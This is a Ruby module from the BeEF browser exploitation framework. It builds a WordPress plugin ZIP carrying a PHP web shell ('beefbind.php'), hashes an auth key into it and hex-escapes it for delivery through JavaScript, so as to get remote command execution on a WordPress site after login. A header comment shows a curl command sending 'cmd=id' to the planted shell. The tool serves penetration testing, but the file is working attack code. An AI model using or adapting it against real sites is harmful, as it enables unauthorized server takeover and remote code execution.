#
# Copyright (c) Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
# This is a rewrite of the original module misc/wordpress_post_auth_rce.
#
# Original Author: Bart Leppens
# Rewritten by Erwan LR (@erwan_lr | WPScanTeam)
#
# To be executed, the request needs a BEEF header with the value of the auth_key option, example:
# curl -H 'BEEF: c9c3a2dcff54c5e2' -X POST --data 'cmd=id' http://wp.lab/wp-content/plugins/beefbind/beefbind.php
#

require 'digest/sha1'
require_relative '../wordpress_command'

class Wordpress_upload_rce_plugin < WordPressCommand
  # Generate the plugin ZIP file as string. The method is called in the command.js.
  # This allows easy modification of the beefbind.php to suit the needs, as well as being automatically generated
  # even when the module is used with automated rules
  def self.generate_zip_payload(auth_key)
    stringio = Zip::OutputStream.write_buffer do |zio|
      zio.put_next_entry('beefbind.php')

      file_content = File.read(File.join(File.dirname(__FILE__), 'beefbind.php')).to_s
      file_content.gsub!(/#SHA1HASH#/, Digest::SHA1.hexdigest(auth_key))

      zio.write(file_content)
    end

    stringio.rewind

    payload         = stringio.sysread
    escaped_payload = ''

    # Escape payload to be able to put it in the JS
    payload.each_byte do |byte|
      escaped_payload << ("\\#{'x%02X' % byte}")
    end

    escaped_payload
  end

  def self.options
    super() + [
      { 'name' => 'auth_key', 'ui_label' => 'Auth Key', 'value' => SecureRandom.hex(8) }
    ]
  end
end
